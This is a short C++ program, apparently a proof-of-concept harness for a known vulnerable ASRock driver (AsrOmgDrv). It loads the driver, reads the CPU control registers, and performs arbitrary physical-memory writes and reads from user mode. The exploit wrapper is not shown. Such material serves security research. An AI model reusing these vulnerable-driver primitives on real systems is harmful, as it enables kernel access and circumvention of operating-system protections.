#include "Native.h"
#include "Driver.h"
#include <iostream>
#include <map>

void DriverTest(CDriver* driver)
{
    printf("Irql = 0x%I64X\n", driver->KeGetCurrentIrql());
    printf("Cr0 = 0x%I64X\n", driver->ReadCr0());
    printf("Cr2 = 0x%I64X\n", driver->ReadCr2());
    printf("Cr3 = 0x%I64X\n", driver->ReadCr3());
    printf("Cr4 = 0x%I64X\n", driver->ReadCr4());

    CONST ULONG BufferSize = 4096;
    UCHAR Buffer[BufferSize] = { 0 };

    ULONG PhysicalAddress = 0;
    if (ULONGLONG VirtualAddress = driver->AllocateMemory(BufferSize, &PhysicalAddress))
    {
        printf("PhysicalAddress = 0x%X\n", PhysicalAddress);
        printf("VirtualAddress = 0x%I64X\n", VirtualAddress);

        if (driver->WritePhysical(PhysicalAddress, DriverTest, BufferSize))
        {
            if (driver->ReadPhysical(PhysicalAddress, Buffer, BufferSize))
            {
                printf("memcmp = %d\n", memcmp(DriverTest, Buffer, BufferSize));
            }
        }

        driver->FreeMemory(VirtualAddress, BufferSize);
    }

}

int main()
{
    SetConsoleTitleW(L"[Vulnerable 28.09.2012] AsrOmgDrv");

    CDriver driver;
    if (driver.Load())
    {
        DriverTest(&driver);
        driver.Unload();
    }

    printf("press [Enter] to close the console");
    getchar();
    return 0;
}
